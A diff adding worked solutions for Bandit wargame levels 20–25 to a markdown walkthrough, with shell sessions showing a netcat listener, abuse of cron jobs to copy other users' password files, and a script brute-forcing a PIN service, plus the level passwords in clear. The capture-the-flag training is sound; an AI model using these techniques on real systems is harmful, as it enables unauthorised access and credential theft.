@@ -525,34 +525,171 @@ bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
 
-#### Level 20 > Level 21
+#### ***Level 20 > Level 21
 
 ```bash
-
+bandit20@melissa:~$ ls
+suconnect
+bandit20@melissa:~$ ./suconnect
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the
+correct password from the other side, the next password is transmitted back.
+ 
+#In one shell do:
+bandit20@melissa:~$ nc -l 3222
+ 
+#In another shell do:
+bandit20@melissa:~$ ls
+suconnect
+bandit20@melissa:~$ ./suconnect 3222
+ 
+#When the connection is made, go back to the first shell, and paste the password in netcat.
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+ 
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
 ```
 
 #### Level 21 > Level 22
 
 ```bash
-
+bandit21@bandit:~$ cd /etc/cron.d/
+bandit21@bandit:/etc/cron.d$ ls -la
+total 24
+drwxr-xr-x  2 root root 4096 Oct 16  2018 .
+drwxr-xr-x 88 root root 4096 Oct 16  2018 ..
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
+-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ```
 
 #### Level 22 > Level 23
 
 ```bash
+bandit22@bandit:~$ cd /etc/cron.d
+bandit22@bandit:/etc/cron.d$ ls -la
+total 24
+drwxr-xr-x  2 root root 4096 Oct 16  2018 .
+drwxr-xr-x 88 root root 4096 Oct 16  2018 ..
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
+-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
 
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 
 #### Level 23 > Level 24
 
 ```bash
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls -la
+total 24
+drwxr-xr-x  2 root root 4096 Oct 16  2018 .
+drwxr-xr-x 88 root root 4096 Oct 16  2018 ..
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
+-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> tmp/Ignite123/level24
+~
+~
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/Ignite123
+bandit23@bandit:/etc/cron.d$ cd /tmp/Ignite123
+bandit23@bandit:/tmp/Ignite123$ vi bandit24.sh
+	#!/bin/bash
+	cat /etc/bandit_pass/bandit24 >> /tmp/Ignite123/level24
+bandit23@bandit:/tmp/Ignite123$ chmod 777 bandit24.sh
+bandit23@bandit:/tmp/Ignite123$ cp bandit24.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/Ignite123$ chmod 777 /tmp/Ignite123
+bandit23@bandit:/tmp/Ignite123$ ls
+bandit24.sh  level24
+bandit23@bandit:/tmp/Ignite123$ cat level24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
+
+```bash
+echo I am user bandit24 | md5sum | cut -d ' ' -f 1
+cat /tmp/ee4ee1703b083edac9f8183e4ae70293
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+ssh bandit24@localhost
+```
+
+
 
 #### Level 24 > Level 25
 
 ```bash
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+^C
+bandit24@bandit:~$ mkdir /tmp/pavan2
+bandit24@bandit:~$ cd /tmp/pavan2
+bandit24@bandit:/tmp/pavan2$ vi bruteforcer.sh
+  #!/bin/bash
+  passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+  for i in {8000..8999}
+  do
+  echo $passwd' '$i >> output.txt
+  done
+bandit24@bandit:/tmp/pavan2$ chmod 777 bruteforcer.sh
+bandit24@bandit:/tmp/pavan2$ ./bruteforcer.sh
+bandit24@bandit:/tmp/pavan2$ cat output.txt | nc localhost 30002 >> result.txt
+bandit24@bandit:/tmp/pavan2$ sort result.txt | uniq -u
 
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+bandit24@bandit:/tmp/pavan2$ ssh bandit25@localhost
 ```
 
 #### Level 25 > Level 26
